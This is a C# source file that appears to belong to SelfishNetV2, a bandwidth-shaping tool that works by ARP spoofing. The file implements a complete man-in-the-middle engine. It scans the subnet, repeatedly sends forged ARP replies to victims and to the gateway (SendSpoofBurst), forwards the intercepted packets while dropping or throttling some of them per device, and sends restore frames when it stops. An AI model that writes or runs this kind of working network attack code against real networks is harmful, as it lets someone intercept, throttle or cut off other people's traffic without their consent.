using SelfishNetV2.Core;
using SelfishNetV2.Drivers;

namespace SelfishNetV2.Engines;

/// <summary>
/// Shared engine machinery: ARP listener, discovery sweep, spoof scheduler,
/// packet forwarder, keep-alive/eviction janitor, stats sampler.
///
/// Wire protocol is IDENTICAL for both engines (frame bytes come from the
/// parity-tested <see cref="ArpFrameBuilder"/>); only these policies differ:
///   · cap policy        — <see cref="TryPassDown"/>/<see cref="TryPassUp"/>
///   · spoof burst shape — <see cref="SendInertSelfFrame"/>
///   · capture filter    — <see cref="IpFilter"/>
///   · frame classifier  — <see cref="Classify"/>
///
/// Threading: one capture session per handle ("arp" + "ip"), each with its own
/// receive thread; shutdown always follows breakloop → join → close (C2).
/// The catalog's eviction path unspoofs actively-spoofed devices first (C3).
/// </summary>
public abstract class EngineSessionBase : IEngineSession
{
    protected const int ArpTimeoutMs = 20;
    protected const int SpoofIntervalMs = 5000;   // original timerSpoof
    protected const int StatsIntervalMs = 1000;   // original timer1
    protected const int JanitorIntervalMs = 5000; // original timer2
    protected const double ProbeAfterSilentSec = 20;   // original keep-alive probe
    protected const double EvictAfterSilentSec = 350;  // original eviction (~5.8 min)
    protected const int UnspoofRepetitions = 35;       // original completeUnspoof

    protected readonly DeviceCatalog Catalog;
    protected readonly IPcapDriver Driver;
    private readonly object _lifecycle = new();
    private static bool _abiChecked;

    private PcapCaptureSession? _arp;   // "arp" handle: listener + spoof/restore sender
    private PcapCaptureSession? _ip;    // "ip" handle: forwarder
    private CancellationTokenSource? _lifeCts;   // Open → Close (housekeeping threads)
    private CancellationTokenSource? _shapeCts;  // shaping only (spoof scheduler)
    private Thread? _spoofThread;
    private Thread? _statsThread;
    private Thread? _janitorThread;
    private readonly ManualResetEventSlim _spoofWake = new(false);
    private readonly byte[] _txBuffer = new byte[65535]; // forwarder scratch (single-threaded per session)
    private readonly byte[] _probeBuffer = new byte[ArpFrameBuilder.FrameLength]; // janitor thread only
    private bool _abiArpFrameChecked, _abiIpFrameChecked;

    private long _forwardedDown, _forwardedUp, _dropped;
    private volatile EngineRunState _state = EngineRunState.Closed;

    public abstract EngineKind Kind { get; }
    public EngineRunState State => _state;
    public AdapterInfo? Adapter { get; private set; }
    public bool IsDiscovering { get; private set; }
    public long ForwardedDown => Interlocked.Read(ref _forwardedDown);
    public long ForwardedUp => Interlocked.Read(ref _forwardedUp);
    public long Dropped => Interlocked.Read(ref _dropped);

    public event EventHandler<EngineErrorEventArgs>? Error;
    public event EventHandler? StateChanged;
    public event EventHandler? StatsTick;

    // ----- engine-specific policy hooks -----
    protected abstract string IpFilter { get; }
    protected abstract bool SendInertSelfFrame { get; }
    protected abstract PacketFlow Classify(ReadOnlySpan<byte> frame, in ForwardingContext ctx, out PacketMatch match);
    protected abstract bool TryPassDown(Device dev, int bytes);
    protected abstract bool TryPassUp(Device dev, int bytes);
    protected virtual void ConfigureIpCapture(PcapCaptureSession session) { }

    protected EngineSessionBase(DeviceCatalog catalog, IPcapDriver driver)
    {
        Catalog = catalog;
        Driver = driver;
    }

    // ================= lifecycle =================

    public bool Open(AdapterInfo adapter)
    {
        lock (_lifecycle)
        {
            if (_state != EngineRunState.Closed) CloseCore(healIfNeeded: true);
            try
            {
                if (!_abiChecked)
                {
                    PcapAbiSelfTest.ValidateStructs();
                    _abiChecked = true;
                }
                Adapter = adapter;
                Catalog.AddOrUpdate(adapter.LocalIpKey, adapter.MacKey, isLocal: true);
                if (adapter.GatewayIpKey != 0)
                    Catalog.AddOrUpdate(adapter.GatewayIpKey, 0, isGateway: true);

                var arpCap = Driver.OpenLive(adapter.PcapName, "arp", timeoutMs: ArpTimeoutMs);
                _arp = new PcapCaptureSession(arpCap, "arp");
                _arp.PacketReceived += OnArpFrame;
                _arp.ReceiveError += e => RaiseError(EngineErrorKind.ReceiveError, e);
                _arp.Start();

                _lifeCts = new CancellationTokenSource();
                StartHousekeepingThreads(_lifeCts.Token);
                SetState(EngineRunState.Idle);

                // Active gateway MAC learning (original findMacRouter).
                if (adapter.GatewayIpKey != 0 && !GatewayMacKnown())
                    _ = ResolveMacAsync(adapter.GatewayIpKey);
                return true;
            }
            catch (PcapException ex)
            {
                RaiseError(EngineErrorKind.DriverOpen, ex.Message);
                CloseCore(healIfNeeded: false);
                return false;
            }
            catch (Exception ex)
            {
                RaiseError(EngineErrorKind.Internal, ex.Message);
                CloseCore(healIfNeeded: false);
                return false;
            }
        }
    }

    public void Close()
    {
        lock (_lifecycle) CloseCore(healIfNeeded: true);
    }

    private void CloseCore(bool healIfNeeded)
    {
        bool wasShaping = _state == EngineRunState.Shaping;
        _state = EngineRunState.Closed;
        StopDiscovery();
        _shapeCts?.Cancel();
        _lifeCts?.Cancel();
        _spoofWake.Set();
        JoinThread(_spoofThread); _spoofThread = null;
        _ip?.Dispose(); _ip = null;   // breakloop → join → close (inside session)
        if (wasShaping && healIfNeeded)
            UnspoofAllTargets();
        JoinThread(_statsThread); _statsThread = null;
        JoinThread(_janitorThread); _janitorThread = null;
        _shapeCts?.Dispose(); _shapeCts = null;
        _lifeCts?.Dispose(); _lifeCts = null;
        _arp?.Dispose(); _arp = null;
        Adapter = null;
        StateChanged?.Invoke(this, EventArgs.Empty);
    }

    public void Dispose() => Close();

    // ================= discovery =================

    public void StartDiscovery()
    {
        var adapter = Adapter;
        if (IsDiscovering || adapter == null || _arp == null) return;
        IsDiscovering = true;
        Task.Run(() =>
        {
            try
            {
                Span<byte> buf = stackalloc byte[ArpFrameBuilder.FrameLength];
                foreach (uint target in NetworkAdapterEnumerator.EnumerateSubnet(adapter.LocalIpKey, adapter.MaskKey))
                {
                    if (!IsDiscovering) break;
                    if (target == adapter.LocalIpKey) continue;
                    ArpFrameBuilder.BuildRequest(buf, adapter.MacKey, adapter.LocalIpKey, target);
                    _arp.Send(buf);
                    Thread.Sleep(5); // original pacing: one ARP request per ~5 ms
                }
            }
            catch { /* capture closed mid-scan is non-fatal */ }
            finally { IsDiscovering = false; }
        });
    }

    public void StopDiscovery() => IsDiscovering = false;

    // ================= ARP listener (original arpListener) =================

    private void OnArpFrame(ReadOnlySpan<byte> frame)
    {
        var adapter = Adapter;
        if (adapter == null) return;
        if (!_abiArpFrameChecked)
        {
            _abiArpFrameChecked = true;
            if (!PcapAbiSelfTest.ValidateFrameHeader((uint)frame.Length, (uint)frame.Length, out string problem))
                RaiseError(EngineErrorKind.AbiMismatch, problem);
        }
        if (!ArpFrame.TryParse(frame, out var a)) return;
        if (a.EthSrcMac == adapter.MacKey) return;                    // skip our own frames
        if (a.Opcode != ArpFrameBuilder.OpcodeReply) return;          // replies only
        bool isGw = a.SenderIp == adapter.GatewayIpKey;
        bool isLocal = a.SenderIp == adapter.LocalIpKey;
        // Original learns the ROUTER MAC from the Ethernet source field; other
        // devices from the ARP sender field (identical on genuine replies).
        ulong mac = isGw ? a.EthSrcMac : a.SenderMac;
        Catalog.AddOrUpdate(a.SenderIp, mac, isGw, isLocal);
    }

    // ================= shaping (spoof + forward) =================

    public async Task<bool> StartShapingAsync(CancellationToken ct = default)
    {
        var adapter = Adapter;
        if (adapter == null || _state == EngineRunState.Closed)
        {
            RaiseError(EngineErrorKind.Internal, "no adapter open");
            return false;
        }
        if (_state == EngineRunState.Shaping) return true;

        // M2 hard gate: never shape/forward without a known gateway MAC.
        if (adapter.GatewayIpKey != 0 && !GatewayMacKnown())
        {
            await ResolveMacAsync(adapter.GatewayIpKey, attempts: 4, delayMs: 250, ct).ConfigureAwait(false);
            if (!GatewayMacKnown())
            {
                RaiseError(EngineErrorKind.GatewayMacUnknown, NetKeys.FormatIp(adapter.GatewayIpKey));
                return false;
            }
        }

        try
        {
            var ipCap = Driver.OpenLive(adapter.PcapName, IpFilter, timeoutMs: ArpTimeoutMs);
            var session = new PcapCaptureSession(ipCap, "ip");
            ConfigureIpCapture(session);
            session.PacketReceived += OnIpFrame;
            session.ReceiveError += e => RaiseError(EngineErrorKind.ReceiveError, e);

            _shapeCts?.Cancel(); _shapeCts?.Dispose();
            _shapeCts = new CancellationTokenSource();
            _spoofWake.Reset();
            _spoofThread = new Thread(() => SpoofLoop(_shapeCts.Token)) { IsBackground = true, Name = "spoof-tx" };
            _ip = session;
            _spoofThread.Start();   // immediate first burst, then every 5 s
            session.Start();
            SetState(EngineRunState.Shaping);
            return true;
        }
        catch (PcapException ex)
        {
            RaiseError(EngineErrorKind.DriverOpen, ex.Message);
            return false;
        }
    }

    public Task StopAndHealAsync() => Task.Run(() =>
    {
        lock (_lifecycle)
        {
            if (_state != EngineRunState.Shaping) return;
            SetState(EngineRunState.Idle);
            _spoofWake.Set();
            JoinThread(_spoofThread); _spoofThread = null;
            _ip?.Dispose(); _ip = null;   // breakloop → join → close
            UnspoofAllTargets();
        }
    });

    private void SpoofLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try { SendSpoofBurst(); } catch { /* send failures are non-fatal */ }
            try { _spoofWake.Wait(SpoofIntervalMs, ct); }
            catch (OperationCanceledException) { return; }
        }
    }

    /// <summary>One re-poison round over every targeted device (original Spoof per victim).</summary>
    protected virtual void SendSpoofBurst()
    {
        var adapter = Adapter;
        var arp = _arp;
        if (adapter == null || arp == null || adapter.GatewayIpKey == 0) return;
        ulong routerMac = RouterMac();
        if (routerMac == 0) return; // cannot poison the router without knowing it

        Span<byte> buf = stackalloc byte[ArpFrameBuilder.FrameLength];
        foreach (var v in Catalog.SpoofTargets())
        {
            // 1. to victim: "router is at us"
            ArpFrameBuilder.BuildPoison(buf, adapter.MacKey, adapter.GatewayIpKey, v.MacKey, v.IpKey);
            arp.Send(buf);
            // 2. to router: "victim is at us"
            ArpFrameBuilder.BuildPoison(buf, adapter.MacKey, v.IpKey, routerMac, adapter.GatewayIpKey);
            arp.Send(buf);
            // 3. self-refresh: our listener re-learns the TRUE router MAC every round
            ArpFrameBuilder.BuildSelfRefresh(buf, adapter.MacKey, adapter.LocalIpKey, routerMac, adapter.GatewayIpKey);
            arp.Send(buf);
            // 4. inert codegen leftover — Legacy only, for behavioral parity
            if (SendInertSelfFrame)
            {
                ArpFrameBuilder.BuildInertSelf(buf, adapter.MacKey, adapter.LocalIpKey, v.MacKey, v.IpKey);
                arp.Send(buf);
            }
        }
    }

    /// <summary>Genuine restore pair for one victim, <see cref="UnspoofRepetitions"/>× (original UnSpoof).</summary>
    protected void UnspoofDevice(Device victim)
    {
        var adapter = Adapter;
        var arp = _arp;
        if (adapter == null || arp == null || adapter.GatewayIpKey == 0 || !victim.HasKnownMac) return;
        ulong routerMac = RouterMac();
        if (routerMac == 0) return;
        try
        {
            Span<byte> buf = stackalloc byte[ArpFrameBuilder.FrameLength];
            for (int i = 0; i < UnspoofRepetitions; i++)
            {
                ArpFrameBuilder.BuildRestore(buf, routerMac, adapter.GatewayIpKey, victim.MacKey, victim.IpKey);
                arp.Send(buf);
                ArpFrameBuilder.BuildRestore(buf, victim.MacKey, victim.IpKey, routerMac, adapter.GatewayIpKey);
                arp.Send(buf);
            }
        }
        catch { /* best-effort heal */ }
    }

    private void UnspoofAllTargets()
    {
        foreach (var v in Catalog.SpoofTargets())
            UnspoofDevice(v);
    }

    // ================= forwarder (original redirector) =================

    private void OnIpFrame(ReadOnlySpan<byte> frame)
    {
        var adapter = Adapter;
        var ip = _ip;
        if (adapter == null || ip == null) return;
        if (!_abiIpFrameChecked)
        {
            _abiIpFrameChecked = true;
            if (!PcapAbiSelfTest.ValidateFrameHeader((uint)frame.Length, (uint)frame.Length, out string problem))
                RaiseError(EngineErrorKind.AbiMismatch, problem);
        }

        int len = frame.Length;
        ulong routerMac = RouterMac(); // re-read per packet, like the original
        var ctx = new ForwardingContext { LocalMac = adapter.MacKey, LocalIp = adapter.LocalIpKey, RouterMac = routerMac };
        PacketFlow flow = Classify(frame, ctx, out var match);

        switch (flow)
        {
            case PacketFlow.Own:
                if (Catalog.TryGetByIp(adapter.LocalIpKey, out var self)) self.AddUp(len);
                return;

            case PacketFlow.LocalDownload:
                if (Catalog.TryGetByIp(adapter.LocalIpKey, out self)) self.AddDown(len);
                return;

            case PacketFlow.Download:
            {
                if (!Catalog.TryGetByIp(match.DstIp, out var dev) || dev.IsLocalPc || dev.IsGateway) return;
                dev.AddDown(len);
                if (!dev.Redirect || !TryPassDown(dev, len)) { Interlocked.Increment(ref _dropped); return; }
                Forward(frame, len, dev.MacKey, adapter.MacKey, ip);
                Interlocked.Increment(ref _forwardedDown);
                return;
            }
            case PacketFlow.Upload:
            {
                if (routerMac == 0) { Interlocked.Increment(ref _dropped); return; } // never emit to broadcast (M2)
                if (!Catalog.TryGetByMac(match.SrcMac, out var dev) || dev.IsLocalPc || dev.IsGateway) return;
                dev.AddUp(len);
                if (!dev.Redirect || !TryPassUp(dev, len)) { Interlocked.Increment(ref _dropped); return; }
                Forward(frame, len, routerMac, adapter.MacKey, ip);
                Interlocked.Increment(ref _forwardedUp);
                return;
            }
        }
    }

    private void Forward(ReadOnlySpan<byte> frame, int len, ulong dstMac, ulong srcMac, PcapCaptureSession ip)
    {
        if (len > _txBuffer.Length) return;
        frame[..len].CopyTo(_txBuffer);
        NetKeys.WriteMac(_txBuffer, 0, dstMac);
        NetKeys.WriteMac(_txBuffer, 6, srcMac);
        ip.Send(_txBuffer.AsSpan(0, len));
    }

    // ================= housekeeping: stats + liveness =================

    private void StartHousekeepingThreads(CancellationToken outerCt)
    {
        _statsThread = new Thread(() => StatsLoop(outerCt)) { IsBackground = true, Name = "stats" };
        _janitorThread = new Thread(() => JanitorLoop(outerCt)) { IsBackground = true, Name = "janitor" };
        _statsThread.Start();
        _janitorThread.Start();
    }

    private void StatsLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try { if (ct.WaitHandle.WaitOne(StatsIntervalMs)) return; } catch { return; }
            foreach (var dev in Catalog.Devices)
            {
                dev.LastDownSample = dev.ResetDownWindow();
                dev.LastUpSample = dev.ResetUpWindow();
            }
            try { StatsTick?.Invoke(this, EventArgs.Empty); } catch { }
        }
    }

    private void JanitorLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try { if (ct.WaitHandle.WaitOne(JanitorIntervalMs)) return; } catch { return; }
            var adapter = Adapter;
            var arp = _arp;
            if (adapter == null || arp == null) continue;
            var now = DateTime.UtcNow;
            foreach (var dev in Catalog.Snapshot())
            {
                if (dev.IsLocalPc || dev.IsGateway || !dev.HasKnownMac) continue;
                double silent = (now - dev.LastSeenUtc).TotalSeconds;
                if (silent > EvictAfterSilentSec)
                {
                    // C3 fix: never orphan a poisoned victim — heal it before eviction.
                    if (_state == EngineRunState.Shaping && dev.Targeted)
                        UnspoofDevice(dev);
                    Catalog.Remove(dev.IpKey);
                }
                else if (silent > ProbeAfterSilentSec)
                {
                    // original 20 s unicast keep-alive probe
                    try
                    {
                        ArpFrameBuilder.BuildUnicastProbe(_probeBuffer, adapter.MacKey, adapter.LocalIpKey, dev.MacKey, dev.IpKey);
                        arp.Send(_probeBuffer);
                    }
                    catch { }
                }
            }
        }
    }

    // ================= helpers =================

    protected ulong RouterMac() =>
        Adapter is { GatewayIpKey: not 0 } a &&
        Catalog.TryGetByIp(a.GatewayIpKey, out var gw) ? gw.MacKey : 0;

    protected bool GatewayMacKnown() => RouterMac() != 0;

    /// <summary>Active MAC resolution (original findMac): broadcast "who-has" until answered.</summary>
    protected async Task ResolveMacAsync(uint ipKey, int attempts = 4, int delayMs = 250, CancellationToken ct = default)
    {
        for (int i = 0; i < attempts; i++)
        {
            if (Catalog.TryGetByIp(ipKey, out var dev) && dev.HasKnownMac) return;
            SendArpRequest(ipKey);
            try { await Task.Delay(delayMs, ct).ConfigureAwait(false); }
            catch (OperationCanceledException) { return; }
        }
    }

    private void SendArpRequest(uint targetIpKey)
    {
        var adapter = Adapter;
        if (adapter == null) return;
        try
        {
            Span<byte> buf = stackalloc byte[ArpFrameBuilder.FrameLength];
            ArpFrameBuilder.BuildRequest(buf, adapter.MacKey, adapter.LocalIpKey, targetIpKey);
            _arp?.Send(buf);
        }
        catch { }
    }

    private void SetState(EngineRunState s)
    {
        _state = s;
        StateChanged?.Invoke(this, EventArgs.Empty);
    }

    private void RaiseError(EngineErrorKind kind, string detail) =>
        Error?.Invoke(this, new EngineErrorEventArgs(kind, detail));

    private static void JoinThread(Thread? t, int timeoutMs = 5000)
    {
        if (t is { IsAlive: true }) t.Join(timeoutMs);
    }
}
